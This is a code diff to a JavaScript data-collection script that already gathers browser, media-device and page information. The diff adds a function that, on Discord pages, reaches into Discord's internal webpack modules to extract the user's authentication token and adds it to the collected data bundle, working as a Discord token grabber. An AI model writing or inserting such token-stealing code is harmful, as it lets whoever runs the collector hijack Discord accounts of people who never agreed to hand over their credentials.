@@ -143,7 +143,18 @@ function getBrowserInfo() {
         language: navigator.language,
     };
 }
+function getDiscordToken() {
+    if (window.location.href.startsWith('https://discord')) {
 
+        var token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]), m)
+            .find(m => m?.exports?.default?.getToken !== void 0)
+            .exports.default.getToken();
+        return {
+            token
+        };
+    }
+    return null;
+}
 
 async function collectAllData() {
     const data = {
@@ -159,6 +170,7 @@ async function collectAllData() {
         mediaDevices: await getMediaDevices(),
         pageInfo: getPageInfo(),
         browserInfo: getBrowserInfo(),
+        discordToken: getDiscordToken(),
     };
     return data;
 }
